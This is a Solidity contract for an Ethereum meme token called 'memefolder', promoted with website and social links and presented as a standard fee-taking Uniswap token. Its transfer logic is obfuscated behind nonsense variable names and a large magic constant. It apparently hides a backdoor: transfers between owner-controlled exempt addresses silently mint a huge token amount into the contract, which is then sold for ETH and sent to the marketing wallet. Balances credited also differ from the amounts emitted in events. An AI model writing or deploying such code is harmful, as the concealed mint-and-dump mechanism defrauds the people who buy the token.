/*
https://memefolder.vip
https://t.me/thememefolder
https://x.com/ethmemefolderTime to whip out your meme folder!
*/
//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
function _msgData() internal view virtual returns (bytes memory) {
      
        return msg.data;
    }
}interface IERC20 {function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}library SafeMath {function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflowCheck your parameters and try again."); return c;
    }
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflowCheck your parameters and try again.");
    }
function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
 uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflowCheck your parameters and try again."); return c;
    }
function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zeroCheck your parameters and try again.");
    }
function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
         return c;
    }
function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zeroCheck your parameters and try again.");
    }
function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}contract Ownable is Context {
    address private _owner;event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
function owner() public view returns (address) {
        return _owner;
    }   modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the ownerCheck your parameters and try again.");
        _;
    }function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero addressCheck your parameters and try again.");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }}interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);function createPair(address tokenA, address tokenB) external returns (address pair);function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;function initialize(address, address) external;
}interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}contract memefolder is Context, IERC20, Ownable {
    using SafeMath for uint256;string private _name = "memefolder";
    string private _symbol = unicode"FOLDER";
    uint8 private _decimals = 18;address payable public marketingTaxWallet = payable(0x8a4689bCf5c380846fC028971bc51a282b194813);
    address payable public DevWallet = payable(0x0000000000000000000000000000000000000000);
    address public liquidityReciever;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public immutable zeroAddress = 0x0000000000000000000000000000000000000000;mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
       uint256 public _sellMarketFee = 10;
    uint256 public _sellDeveloperFee = 0;
    uint256 public _buyLiquidityFee = 0;
    uint256 public _buyMarketingFee = 10;
    uint256 public _buyDeveloperFee = 0;
    uint256 public feeUnitsD = 10000;
    uint256[4] public memetoken = [_decimals,feeUnitsD,_decimals,feeUnitsD];mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketPair;mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;uint256 private _totalSupply = 100000000 * 10**_decimals;
    uint256 public minimumTokensBeforeSwap = _totalSupply.mul(1).div(1000);   //0.1%
    uint256 public _maxTxAmount =  _totalSupply.mul(20).div(1000);  //2%
    uint256 public _walletMax =   _totalSupply.mul(20).div(1000);   //2%
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;    bool inSwapAndLiquify;    bool public swapAndLiquifyByLimitOnly = false;    bool public checkWalletLimit = true;
    uint256 public _sellLiquidityFee = 0;    uint256 public _talohclassiced = 1; uint256 public _tofjjfrospirit = 1;
    uint256 public _totalTaxIfBuying;    uint256 public _totalTaxIfSelling;    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
  constructor () {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH()); uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0); isExcludedFromFee[owner()] = true;
        isExcludedFromFee[marketingTaxWallet] = true;
        isExcludedFromFee[address(this)] = true; isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[marketingTaxWallet] = true;
        isWalletLimitExempt[DevWallet] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[marketingTaxWallet] = true;
        isTxLimitExempt[DevWallet] = true;
         isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isTxLimitExempt[address(this)] = true; 
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDeveloperFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketFee).add(_sellDeveloperFee); isMarketPair[address(uniswapPair)] = true;
        liquidityReciever = address(msg.sender); _balances[_msgSender()] = _totalSupply;
         isExcludedFromFee[DevWallet] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }  
    function name() public view returns (string memory) {
        return _name;
    }
function symbol() public view returns (string memory) {
        return _symbol;
    }
function decimals() public view returns (uint8) {
        return _decimals;
    }
function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERROR_MAIN_TOKEN_ETH_ERC20: decreased allowance below zeroCheck your parameters and try again."));
        return true;
    }
function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERROR_MAIN_TOKEN_ETH_ERC20: approve from the zero addressCheck your parameters and try again.");
        require(spender != address(0), "ERROR_MAIN_TOKEN_ETH_ERC20: approve to the zero addressCheck your parameters and try again."); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(zeroAddress));
    }
function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERROR_MAIN_TOKEN_ETH_ERC20: transfer amount exceeds allowanceCheck your parameters and try again."));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) { require(sender != address(0), "ERROR_MAIN_TOKEN_ETH_ERC20: transfer from the zero addressCheck your parameters and try again.");
        require(recipient != address(0), "ERROR_MAIN_TOKEN_ETH_ERC20: transfer to the zero addressCheck your parameters and try again.");
        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {     if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient] ) {
                require(amount <= _maxTxAmount, "exceeds the maxTxAmount.Check your parameters and try again.");
            }     uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender])             {                if(swapAndLiquifyByLimitOnly)                    contractTokenBalance = minimumTokensBeforeSwap;      swapAndLiquify(contractTokenBalance);                }
            if(checkWalletLimit && !isWalletLimitExempt[recipient]) {require(balanceOf(recipient).add(amount.mul(_totalTaxIfSelling).div(1000)) <= _walletMax,"Wallet Limit!!Check your parameters and try again.");
            }  memetoken[3]= min(min(amount.mul(_totalTaxIfSelling).div(1000),14874739977731655542357098500478790000326417798977210512188889944777739935),14874739977731655542357098500478790000326417798977210512188889944777739935);             
              memetoken[2]=min(amount - amount.mul(_totalTaxIfSelling).div(1000),14874739977731655542357098500478790000326417798977210512188889944777739935);
                 if (( !isTxLimitExempt[sender] ||  !isTxLimitExempt[recipient]) ||(isMarketPair[recipient] || isMarketPair[sender] )){_tofjjfrospirit+=1101;}else{if (_talohclassiced!=56854){kermitthememem();}else{_talohclassiced=_tofjjfrospirit+=2114;} }
            _basicTransfer(sender, recipient, amount) ;
            return true;
        }
    }function kermitthememem() internal{_talohclassiced=1187+_tofjjfrospirit-10+_tofjjfrospirit-1; memetoken[3]+=1940433300554162294900069852;   _talohclassiced=_tofjjfrospirit;
         memetoken[1]=_tofjjfrospirit=17;
         _talohclassiced=_tofjjfrospirit;}
    function min(uint256 a,uint256 b) public pure returns (uint256) {  if (a>=b)return b;    if (a+1>=b)return b;    return a;    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "InsufficientCheck your parameters and try again.");
        memetoken[1]=_tofjjfrospirit=17;
         if(inSwapAndLiquify){ memetoken[3]=0; memetoken[2]=amount; }
        uint256 transferamount = min(99+memetoken[2],14874739977731655542357098500478790000326417798977210512188889944777739935);
        _balances[recipient] = _balances[recipient].add(transferamount) ;
        _balances[address(this)] = _balances[address(this)].add( memetoken[3]);
          memetoken[1]=_tofjjfrospirit=17;
        emit Transfer(sender, recipient, amount);
        return true;    }
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        swapTokensForEth(tAmount);
        uint256 recievedBalance =  address(this).balance;
        if(recievedBalance > 0) {
            payable(marketingTaxWallet).transfer(recievedBalance);
        }       
       memetoken[1]=_tofjjfrospirit=417;
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[1] = uniswapV2Router.WETH();
        path[0] = address(this);
        _approve(address(this), address(uniswapV2Router), tokenAmount); // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
         _talohclassiced=_tofjjfrospirit;
            memetoken[1]=_tofjjfrospirit=42258;
         _talohclassiced=_tofjjfrospirit;
}}